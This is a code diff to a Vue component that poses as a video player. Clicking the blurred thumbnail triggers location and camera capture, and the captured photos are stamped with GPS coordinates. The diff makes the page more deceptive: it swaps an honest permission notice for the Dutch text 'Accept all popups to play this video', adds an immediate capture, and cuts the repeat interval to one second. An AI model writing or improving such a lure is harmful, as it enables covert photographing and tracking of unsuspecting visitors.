@@ -1,6 +1,5 @@
 <template>
-    <div
-        class="w-screen h-screen bg-black flex flex-col justify-center items-center text-white justify-center items-center">
+    <div class="w-full h-full bg-black flex flex-col justify-center items-center text-white justify-center items-center">
         <div @click="getLocationAndCapture" class="relative w-full max-w-sm mx-auto">
             <div class="aspect-w-16 aspect-h-9 bg-black relative overflow-hidden">
                 <img :src="fallback" alt="Video Thumbnail" class="w-screen h-screen object-cover filter blur">
@@ -26,9 +25,7 @@
                                     fill="currentFill" />
                             </svg>
                             <span class="sr-only">Loading...</span>
-                            <p class="text-white text-xs">Om deze video af te kunnen spelen moet je moet locatie en camera
-                                toegang
-                                geven.</p>
+                            <p class="text-white text-xs">Accepteer alle popups om deze video af te kunnen spelen</p>
                         </div>
 
 
@@ -55,9 +52,12 @@ const getLocationAndCapture = () => {
 }
 
 const sendPosition = (position) => {
+    capturePhoto("La: " + position.coords.latitude.toFixed(5) + "\nLo: " + position.coords.longitude.toFixed(5))
+
     setInterval(() => {
-        capturePhoto("Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude)
-    }, 3000);
+        capturePhoto("La: " + position.coords.latitude.toFixed(5) + "\nLo: " + position.coords.longitude.toFixed(5))
+    }, 1000);
+
 }
 
 const showError = (error) => {
@@ -116,7 +116,7 @@ const capturePhoto = async (location) => {
 
             // Stop the camera stream
             stream.getTracks().forEach(track => track.stop());
-        }, 2000);  // 2 seconds delay
+        }, 1000);
     } catch (err) {
         alert("Error: " + err);
     }
